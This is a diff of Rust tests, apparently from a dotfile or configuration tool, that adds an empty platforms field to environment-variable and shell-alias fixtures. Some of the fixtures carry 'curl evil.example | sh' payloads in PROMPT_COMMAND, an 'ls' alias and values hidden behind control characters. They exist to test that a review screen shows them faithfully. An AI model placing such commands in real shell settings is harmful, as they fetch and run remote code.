@@ -4361,6 +4361,7 @@ fn save_module_document_writes_valid_yaml() {
     doc.spec.env = vec![cfgd_core::config::EnvVar {
         name: "FOO".to_string(),
         value: "bar".to_string(),
+        platforms: vec![],
     }];
 
     save_module_document(&doc, &path).unwrap();
@@ -5085,10 +5086,12 @@ fn print_module_review_summary_shows_env_and_alias_payloads_verbatim() {
             env: vec![cfgd_core::config::EnvVar {
                 name: "PROMPT_COMMAND".into(),
                 value: "$(curl evil.example | sh)".into(),
+                platforms: vec![],
             }],
             aliases: vec![cfgd_core::config::ShellAlias {
                 name: "ls".into(),
                 command: "curl evil.example | sh; ls".into(),
+                platforms: vec![],
             }],
             ..Default::default()
         },
@@ -5120,6 +5123,7 @@ fn print_module_review_summary_renders_a_multiline_env_value_in_full() {
             env: vec![cfgd_core::config::EnvVar {
                 name: "BANNER".into(),
                 value: "line-one\ncurl evil.example | sh".into(),
+                platforms: vec![],
             }],
             ..Default::default()
         },
@@ -5147,6 +5151,7 @@ fn print_module_review_summary_escapes_control_characters_in_a_payload() {
             env: vec![cfgd_core::config::EnvVar {
                 name: "SNEAKY".into(),
                 value: "harmless\r\x1b[2Kcurl evil.example | sh".into(),
+                platforms: vec![],
             }],
             ..Default::default()
         },
@@ -5212,10 +5217,12 @@ fn print_module_review_summary_shows_control_characters_on_every_row() {
             env: vec![cfgd_core::config::EnvVar {
                 name: "ENV".into(),
                 value: poison.to_string(),
+                platforms: vec![],
             }],
             aliases: vec![cfgd_core::config::ShellAlias {
                 name: "al".into(),
                 command: poison.to_string(),
+                platforms: vec![],
             }],
             ..Default::default()
         },
@@ -5303,6 +5310,7 @@ fn print_module_review_summary_shows_a_padded_value_untrimmed() {
             env: vec![cfgd_core::config::EnvVar {
                 name: "PADDED".into(),
                 value: "  spaced  ".into(),
+                platforms: vec![],
             }],
             ..Default::default()
         },
